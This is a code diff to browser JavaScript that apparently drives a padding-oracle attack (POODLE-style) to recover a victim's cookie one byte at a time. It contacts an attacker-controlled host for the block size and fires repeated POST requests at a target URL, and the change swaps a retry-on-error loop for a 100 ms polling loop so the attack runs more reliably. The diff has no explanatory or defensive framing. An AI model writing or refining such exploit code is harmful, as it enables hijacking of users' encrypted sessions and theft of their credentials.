@@ -16,14 +16,8 @@ function sendRequest(method, url, data, callback, errorcallback, timeout) {
 	request.onerror = function() {
 		errorcallback && errorcallback(request.status, request.statusText)
 	}
-	request.send(data);
-}
-
-function attackByteAttempt(path, data, success) {
-	// If the request is successful (even though we get a 404), we have the padding correct
-	sendRequest('POST', targetUrl + "/" + path, data, success, function(status, message) {
-		attackByteAttempt(path, data, success);
-	});
+	// Make Content-Size minimum 100 so that there is space to grow without changing the length of the Content-Size header
+	request.send(Array(101).join('a') + data);
 }
 
 function attackByte(dataLengthNeeded) {
@@ -35,9 +29,15 @@ function attackByte(dataLengthNeeded) {
 		if (offset > dataLengthNeeded) dataLengthNeeded += blockSize;
 		var path = Array(offset + 1).join("a");
 		var data = Array(dataLengthNeeded - offset + 1).join("a");
-		attackByteAttempt(path, data, function() {
-			attackByte(dataLengthNeeded); // On success, ask for next offset recursively and repeat
-		});
+		var done = false;
+		var attackerInterval = setInterval(function() {
+			sendRequest('POST', targetUrl + "/" + path, data, function() {
+				if (done) return;
+				done = true;
+				clearInterval(attackerInterval);
+				attackByte(dataLengthNeeded); // On success, ask for next offset recursively and repeat
+			});
+		}, 100)
 	});
 }
 
@@ -50,7 +50,7 @@ sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (respon
 
 	// Add the block size to make sure that we have enough room
 	//  to shift the cookie as much as we want
-	setTimeout(function() { attackByte(dataLengthNeeded + blockSize); }, 1000);
+	attackByte(dataLengthNeeded + blockSize);
 }, null, 30000);
 
 // This will only run if the server does not immediately return a block size
